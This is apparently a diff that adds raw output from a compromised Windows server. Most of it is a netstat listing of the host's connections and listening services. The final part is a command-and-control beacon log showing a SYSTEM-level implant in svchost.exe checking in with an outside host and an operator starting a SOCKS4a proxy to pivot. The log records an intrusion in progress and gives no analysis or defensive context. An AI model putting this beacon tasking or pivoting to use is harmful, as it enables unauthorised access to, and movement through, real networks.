+  TCP    100.100.1.199:50396    100.100.1.199:1433     ESTABLISHED     2092
+  TCP    100.100.1.199:50760    116.181.3.49:80        CLOSE_WAIT      6012
+  TCP    100.100.1.199:51230    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:51410    100.100.1.199:1433     ESTABLISHED     2360
+  TCP    100.100.1.199:51498    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:51524    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:51527    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:51532    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:51555    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:51664    100.100.1.199:1433     ESTABLISHED     2092
+  TCP    100.100.1.199:51688    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:51701    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:51710    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:51729    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:51743    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:51835    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:51859    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:51998    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:52000    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:52102    100.100.1.199:1433     ESTABLISHED     2092
+  TCP    100.100.1.199:52105    100.100.1.199:1433     ESTABLISHED     2092
+  TCP    100.100.1.199:52112    100.100.1.199:1433     ESTABLISHED     2092
+  TCP    100.100.1.199:52125    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:52214    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:52259    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:52285    47.114.83.166:80       ESTABLISHED     6024
+  TCP    100.100.1.199:52334    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:52340    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:52353    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:52413    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:52438    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:52442    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:52467    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:52587    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:52595    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:52627    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:52640    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:52714    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:52815    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:52956    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:52968    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:52969    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:52976    100.100.1.199:1433     ESTABLISHED     2360
+  TCP    100.100.1.199:52988    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:53033    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:53041    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:53057    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:53071    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:53076    116.181.3.49:80        CLOSE_WAIT      6760
+  TCP    100.100.1.199:53087    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:53097    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:53111    116.181.3.49:80        CLOSE_WAIT      6760
+  TCP    100.100.1.199:53115    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:53122    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:53131    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:53203    100.100.1.199:1433     ESTABLISHED     2360
+  TCP    100.100.1.199:59274    120.52.183.190:80      CLOSE_WAIT      6012
+  TCP    100.100.1.199:61955    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61956    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61957    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61958    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61961    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61962    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61963    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61964    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61965    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:65023    123.6.65.100:80        CLOSE_WAIT      6760
+  TCP    100.100.1.199:65074    111.6.225.214:80       CLOSE_WAIT      10748
+  TCP    100.100.1.199:65403    100.100.1.199:1433     ESTABLISHED     9196
+  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       7144
+  TCP    127.0.0.1:3306         127.0.0.1:65248        ESTABLISHED     3704
+  TCP    127.0.0.1:49157        127.0.0.1:49158        ESTABLISHED     2600
+  TCP    127.0.0.1:49158        127.0.0.1:49157        ESTABLISHED     2600
+  TCP    127.0.0.1:49213        127.0.0.1:49214        ESTABLISHED     6012
+  TCP    127.0.0.1:49214        127.0.0.1:49213        ESTABLISHED     6012
+  TCP    127.0.0.1:49718        127.0.0.1:49719        ESTABLISHED     2092
+  TCP    127.0.0.1:49719        127.0.0.1:49718        ESTABLISHED     2092
+  TCP    127.0.0.1:65248        127.0.0.1:3306         ESTABLISHED     5272
+  TCP    [::]:21                [::]:0                 LISTENING       2536
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:135               [::]:0                 LISTENING       964
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:800               [::]:0                 LISTENING       1472
+  TCP    [::]:1433              [::]:0                 LISTENING       7144
+  TCP    [::]:1801              [::]:0                 LISTENING       2988
+  TCP    [::]:2103              [::]:0                 LISTENING       2988
+  TCP    [::]:2105              [::]:0                 LISTENING       2988
+  TCP    [::]:2107              [::]:0                 LISTENING       2988
+  TCP    [::]:3196              [::]:0                 LISTENING       5668
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:7776              [::]:0                 LISTENING       4
+  TCP    [::]:8010              [::]:0                 LISTENING       4
+  TCP    [::]:8020              [::]:0                 LISTENING       4
+  TCP    [::]:20200             [::]:0                 LISTENING       6388
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       776
+  TCP    [::]:49153             [::]:0                 LISTENING       552
+  TCP    [::]:49154             [::]:0                 LISTENING       652
+  TCP    [::]:49155             [::]:0                 LISTENING       1364
+  TCP    [::]:49156             [::]:0                 LISTENING       868
+  TCP    [::]:49160             [::]:0                 LISTENING       2988
+  TCP    [::]:49348             [::]:0                 LISTENING       840
+  TCP    [::]:49349             [::]:0                 LISTENING       6536
+  TCP    [::1]:1434             [::]:0                 LISTENING       7144
+  UDP    0.0.0.0:500            *:*                                    652
+  UDP    0.0.0.0:3196           *:*                                    5668
+  UDP    0.0.0.0:4500           *:*                                    652
+  UDP    0.0.0.0:5355           *:*                                    224
+  UDP    0.0.0.0:6001           *:*                                    2600
+  UDP    100.100.1.199:137      *:*                                    4
+  UDP    100.100.1.199:138      *:*                                    4
+  UDP    [::]:500               *:*                                    652
+  UDP    [::]:3196              *:*                                    5668
+  UDP    [::]:4500              *:*                                    652
+  UDP    [::]:5355              *:*                                    224
+
+
+03/09 06:23:18 UTC [metadata] 222.141.67.133 <- 100.100.1.199; computer: WMSDTSERVER; user: SYSTEM *; process: svchost.exe; pid: 652; os: Windows; version: 6.3; build: 9600; beacon arch: x64 (x64)
+03/09 06:38:48 UTC [checkin] host called home, sent: 19 bytes
+03/09 10:56:58 UTC [metadata] 222.141.67.133 <- 100.100.1.199; computer: WMSDTSERVER; user: SYSTEM *; process: svchost.exe; pid: 652; os: Windows; version: 6.3; build: 9600; beacon arch: x64 (x64)
+03/09 11:11:26 UTC [input] <user1> socks 24452
+03/09 11:11:26 UTC [output]
+started SOCKS4a server on: 24452
+
+03/09 11:11:26 UTC [checkin] host called home, sent: 16 bytes
+03/09 14:03:06 UTC [metadata] 222.141.67.133 <- 100.100.1.199; computer: WMSDTSERVER; user: SYSTEM *; process: svchost.exe; pid: 652; os: Windows; version: 6.3; build: 9600; beacon arch: x64 (x64)
